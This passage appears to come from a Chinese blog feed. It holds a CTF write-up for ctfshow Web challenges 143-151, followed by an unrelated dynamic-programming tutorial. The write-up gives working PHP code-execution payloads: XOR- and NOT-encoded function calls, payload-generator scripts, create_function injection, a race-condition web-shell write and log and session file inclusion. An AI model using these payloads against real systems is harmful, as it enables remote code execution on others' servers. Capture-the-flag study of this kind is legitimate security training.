<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;                die(<span class="string">&#x27;get out hacker!&#x27;</span>);        &#125;        <span class="keyword">else</span>&#123;            <span class="variable">$code</span> =  <span class="built_in">eval</span>(<span class="string">&quot;return $v1$v3<span class="variable">$v2</span>;&quot;</span>);            <span class="built_in">echo</span> <span class="string">&quot;$v1$v3<span class="variable">$v2</span> = &quot;</span>.<span class="variable">$code</span>;        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>过滤了一些运算符 <code>+  -  &amp;  %  / ~ $  _  .  </code></li>
<li>过滤了 <code>;</code>  ，使用 <code>?&gt;</code>  代替</li>
</ul>
<p>仍旧有我们可以利用的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# *?v1=1&amp;v3=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# ^?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截</span></span><br></pre></td></tr></table></figure>

<p><strong>^异或拼接 无字母数字脚本</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-# @Time : 20.12.4 23:06# @author:lonmarimport recontent = &#x27;&#x27;preg = &#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/&#x27; # 题目过滤正则# 生成字典for i in range(256):    for j in range(256):        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):            k = i ^ j            if 32 &lt;= k &lt;= 126:                a = &#x27;%&#x27; + hex(i)[2:].zfill(2)                b = &#x27;%&#x27; + hex(j)[2:].zfill(2)                content += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\n&#x27;)f = open(&#x27;exp_xor.txt&#x27;, &#x27;w&#x27;)f.write(content)while True:    payload1 = &#x27;&#x27;    payload2 = &#x27;&#x27;    code = input(&quot;data:&quot;)    for i in code:        f = open(&#x27;rce_or.txt&#x27;)        lines = f.readlines()        for line in lines:            if i == line[0]:                payload1 = payload1 + line[2:5]                payload2 = payload2 + line[6:9]                break    payload = &#x27;(&quot;&#x27;+payload1+&#x27;&quot;^&quot;&#x27;+payload2+&#x27;&quot;)&#x27;    print(&quot;payload: &quot;+ payload)</span></span><br></pre></td></tr></table></figure>



<h2 id="1-45-Web-144-—-143-plus"><a href="#1-45-Web-144-—-143-plus" class="headerlink" title="1.45 Web 144 — 143 plus"></a>1.45 Web 144 — 143 plus</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">143的plus版本</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; check(<span class="variable">$v3</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="variable">$code</span> =  <span class="built_in">eval</span>(<span class="string">&quot;return $v1$v3<span class="variable">$v2</span>;&quot;</span>);            <span class="built_in">echo</span> <span class="string">&quot;$v1$v3<span class="variable">$v2</span> = &quot;</span>.<span class="variable">$code</span>;        &#125;    &#125;&#125;<span class="keyword">function</span> check(<span class="variable">$str</span>)&#123;    <span class="built_in">return</span> strlen(<span class="variable">$str</span>)===1?<span class="literal">true</span>:<span class="literal">false</span>;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload ?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截?v1=1&amp;v2=%00*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v3=1# %00*?v1=1&amp;v2=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v3=1# ^</span></span><br></pre></td></tr></table></figure>

<h2 id="1-46-Web-145-—-144-plus"><a href="#1-46-Web-145-—-144-plus" class="headerlink" title="1.46 Web 145 — 144 plus"></a>1.46 Web 145 — 144 plus</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">144的plus版本</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;                die(<span class="string">&#x27;get out hacker!&#x27;</span>);        &#125;        <span class="keyword">else</span>&#123;            <span class="variable">$code</span> =  <span class="built_in">eval</span>(<span class="string">&quot;return $v1$v3<span class="variable">$v2</span>;&quot;</span>);            <span class="built_in">echo</span> <span class="string">&quot;$v1$v3<span class="variable">$v2</span> = &quot;</span>.<span class="variable">$code</span>;        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>过滤了 <code>;  ^  &lt;   &quot;   &gt;  </code> 和我们能用到的运算符</li>
<li>使用 <code>|   ?</code>    绕过</li>
</ul>
<p><strong>~ 脚本</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php//在命令行中运行/*author yu22x*/fwrite(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);<span class="variable">$system</span>=str_replace(array(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); fwrite(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);<span class="variable">$command</span>=str_replace(array(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); <span class="built_in">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.urlencode(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.urlencode(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>三目运算符</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);	<span class="comment">#可行</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload ?v1=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):&amp;v2=1</span></span><br></pre></td></tr></table></figure>

<h2 id="1-47-Web-146-—-145-plus"><a href="#1-47-Web-146-—-145-plus" class="headerlink" title="1.47 Web 146 — 145 plus"></a>1.47 Web 146 — 145 plus</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">145的plus版本</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;                die(<span class="string">&#x27;get out hacker!&#x27;</span>);        &#125;        <span class="keyword">else</span>&#123;            <span class="variable">$code</span> =  <span class="built_in">eval</span>(<span class="string">&quot;return $v1$v3<span class="variable">$v2</span>;&quot;</span>);            <span class="built_in">echo</span> <span class="string">&quot;$v1$v3<span class="variable">$v2</span> = &quot;</span>.<span class="variable">$code</span>;        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>过滤了 <code>:</code></li>
<li>不能使用三目运算符了</li>
</ul>
<p><strong>测试</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);// <span class="built_in">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);	<span class="comment">#可行// eval(&quot;return 1==phpinfo()|1;&quot;);	#可行// eval(&quot;return 1===phpinfo()|1;&quot;);	#可行// eval(&quot;return 1===phpinfo()||1;&quot;);	#可行 eval(&quot;return 1=phpinfo()||1;&quot;);		#不可行//eval(&quot;return 1=phpinfo()||1;&quot;);		#不可行</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload?v1=1&amp;v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&amp;v2=1</span></span><br></pre></td></tr></table></figure>

<h2 id="1-48-Web-147-—-create-function-命令注入"><a href="#1-48-Web-147-—-create-function-命令注入" class="headerlink" title="1.48 Web 147 — create_function 命令注入"></a>1.48 Web 147 — create_function 命令注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);    &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://my.oschina.net/huyex/blog/2885273">create_function()</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)类似于function f($a) &#123;  echo $a.&quot;123&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>那么如果我们第二个参数传入 <strong>echo 1;}phpinfo();/</strong>/<br>就等价于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function f($a) &#123;  echo 1;&#125;phpinfo();//&#125;从而执行phpinfo()命令</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payloadGET ?show=2;&#125;system(&quot;tac f*&quot;);/*POST ctf=\create_function# \ %5c</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/05/Rftu7sEcSJiKqbM.png" alt="image-20210805185639951"></p>
<h2 id="1-49-Web-148-—-中文变量"><a href="#1-49-Web-148-—-中文变量" class="headerlink" title="1.49 Web 148 — 中文变量"></a>1.49 Web 148 — 中文变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phpinclude <span class="string">&#x27;flag.php&#x27;</span>;<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;        die(<span class="string">&quot;error&quot;</span>);    &#125;    @<span class="built_in">eval</span>(<span class="variable">$code</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;<span class="keyword">function</span> <span class="function"><span class="title">get_ctfshow_fl0g</span></span>()&#123;    <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>未过滤 <code>^   ;</code>    ，可直接异或构造</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);</span></span><br></pre></td></tr></table></figure>

<ul>
<li>利用中文变量</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?code=$哈=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;<span class="variable">$&#123;$哈&#125;</span>[哼](<span class="variable">$&#123;$哈&#125;</span>[嗯]);&amp;哼=system&amp;嗯=tac f*其实也是利用异或构造<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>; 异或出来的结果是 _GET</span><br></pre></td></tr></table></figure>

<h2 id="1-50-Web-149-—-条件竞争"><a href="#1-50-Web-149-—-条件竞争" class="headerlink" title="1.50 Web 149 — 条件竞争"></a>1.50 Web 149 — 条件竞争</h2> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); foreach(<span class="variable">$files</span> as <span class="variable">$file</span>) &#123;    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;            unlink(<span class="variable">$file</span>);        &#125;    &#125;&#125;file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);<span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); foreach(<span class="variable">$files</span> as <span class="variable">$file</span>) &#123;    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;            unlink(<span class="variable">$file</span>);        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在每次 写文件之前之后，都会删除 除了 index.php 之外的任何文件</span></span><br></pre></td></tr></table></figure>

<ul>
<li>解一：直接在 index.php 当中写入代码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 总是成功不了</span></span><br></pre></td></tr></table></figure>

<ul>
<li>解二：条件竞争</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 写入 ?ctf=1.phpshow=&lt;?php system(<span class="string">&#x27;ls /&#x27;</span>); ?&gt;2. 访问 /1.php3. 二者同时进行爆破</span><br></pre></td></tr></table></figure>

<h2 id="1-51-Web-150-—"><a href="#1-51-Web-150-—" class="headerlink" title="1.51 Web 150 —"></a>1.51 Web 150 —</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">对我们以前的内容进行了小结，我们文件上传系列再见！</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phpinclude(<span class="string">&quot;flag.php&quot;</span>);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123;    private <span class="variable">$username</span>;    private <span class="variable">$password</span>;    private <span class="variable">$vip</span>;    private <span class="variable">$secret</span>;    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;        <span class="variable">$this</span>-&gt;vip = 0;        <span class="variable">$this</span>-&gt;secret = <span class="variable">$flag</span>;    &#125;    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;secret;    &#125;    public <span class="keyword">function</span> <span class="function"><span class="title">isVIP</span></span>()&#123;        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;vip?TRUE:FALSE;        &#125;    &#125;    <span class="keyword">function</span> __autoload(<span class="variable">$class</span>)&#123;        <span class="keyword">if</span>(isset(<span class="variable">$class</span>))&#123;            <span class="variable">$class</span>();    &#125;&#125;<span class="comment">#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;    die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123;    echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;    include($ctf);&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===FALSE)&#123;    include(<span class="variable">$ctf</span>);&#125;<span class="comment"># 1.使 $isVIP = 1# 2.$ctf 中不能包含 :</span></span><br></pre></td></tr></table></figure>

<p><strong>写入日志</strong></p>
<p><img src="https://i.loli.net/2021/08/05/6HVGre1oWQunET9.png" alt="image-20210805210149883"></p>
<p><strong>日志包含</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?isVIP=1ctf=/var/<span class="built_in">log</span>/nginx/access.log&amp;a=system(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/05/8RlGgSM6mD7PArW.png" alt="image-20210805210055518"></p>
<h2 id="1-52-Web-151-—"><a href="#1-52-Web-151-—" class="headerlink" title="1.52 Web 151 —"></a>1.52 Web 151 —</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">修复了非预期</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phpinclude(<span class="string">&quot;flag.php&quot;</span>);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123;    private <span class="variable">$username</span>;    private <span class="variable">$password</span>;    private <span class="variable">$vip</span>;    private <span class="variable">$secret</span>;    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;        <span class="variable">$this</span>-&gt;vip = 0;        <span class="variable">$this</span>-&gt;secret = <span class="variable">$flag</span>;    &#125;    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;secret;    &#125;    public <span class="keyword">function</span> <span class="function"><span class="title">isVIP</span></span>()&#123;        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;vip?TRUE:FALSE;        &#125;    &#125;    <span class="keyword">function</span> __autoload(<span class="variable">$class</span>)&#123;        <span class="keyword">if</span>(isset(<span class="variable">$class</span>))&#123;            <span class="variable">$class</span>();    &#125;&#125;<span class="comment">#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;    die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123;    echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123;    include($ctf);&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>过滤了 <code>log</code></li>
</ul>
<p><strong>sess 文件包含</strong></p>
<p><img src="https://i.loli.net/2021/08/05/UsBeVuF4M6XJv7j.png" alt="image-20210805213534877"></p>
<p><img src="https://i.loli.net/2021/08/05/vNDO6bQoxqiZwmL.png" alt="image-20210805213509559"></p>
<p><img src="https://i.loli.net/2021/08/05/q21uFEU9YCBRcQ3.png" alt="image-20210805213448223"></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/109181768">https://blog.csdn.net/miuzzx/article/details/109181768</a></p>
]]></content>
      <categories>
        <category>CTF Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>十、动态规划</title>
    <url>/2025/12/03/%E5%8D%81%E3%80%81%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="十、动态规划"><a href="#十、动态规划" class="headerlink" title="十、动态规划"></a>十、动态规划</h2><h3 id="509-斐波那契数"><a href="#509-斐波那契数" class="headerlink" title="509 斐波那契数"></a>509 斐波那契数</h3><p>斐波那契数 （通常用 F(n) 表示）形成的序列称为 斐波那契数列 。该数列由 0 和 1 开始，后面的每一项数字都是前面两项数字的和。也就是：</p>
<pre><code>F(0) = 0，F(1) = 1
F(n) = F(n - 1) + F(n - 2)，其中 n &gt; 1
</code></pre>
<p>给定 n ，请计算 F(n) 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i]表示 F(n)</span></span><br><span class="line"><span class="comment">    需要初始化 dp[0]和dp[1] 对应 F(0)和F(1)</span></span><br><span class="line"><span class="comment">    注意：前面的判断</span></span><br><span class="line"><span class="comment">        if(n&lt;=1)</span></span><br><span class="line"><span class="comment">            return n;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">            dp[i] = dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>];</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        <span class="comment">//if(n-2==0 &amp;&amp; n-1==1)</span></span><br><span class="line">          <span class="comment">//  return 1;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">fib</span>(n<span class="number">-1</span>)+<span class="built_in">fib</span>(n<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    滚动数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">int</span> dp[<span class="number">2</span>];<span class="comment">//大小 是2即可</span></span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            sum = dp[<span class="number">0</span>]+dp[<span class="number">1</span>];</span><br><span class="line">            dp[<span class="number">0</span>] = dp[<span class="number">1</span>];</span><br><span class="line">            dp[<span class="number">1</span>] = sum;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="70 爬楼梯"></a>70 爬楼梯</h3><p>假设你正在爬楼梯。需要 n 阶你才能到达楼顶。<br>每次你可以爬 1 或 2 个台阶。你有【多少种不同的方法】可以爬到楼顶呢？</p>
<p><strong>分析：</strong><br>爬到第一层楼梯有一种方法，爬到二层楼梯有两种方法。<br>那么第一层楼梯再跨两步就到第三层 ，第二层楼梯再跨一步就到第三层。<br>所以到第三层楼梯的状态可以由第二层楼梯 和 到第一层楼梯状态推导出来。</p>
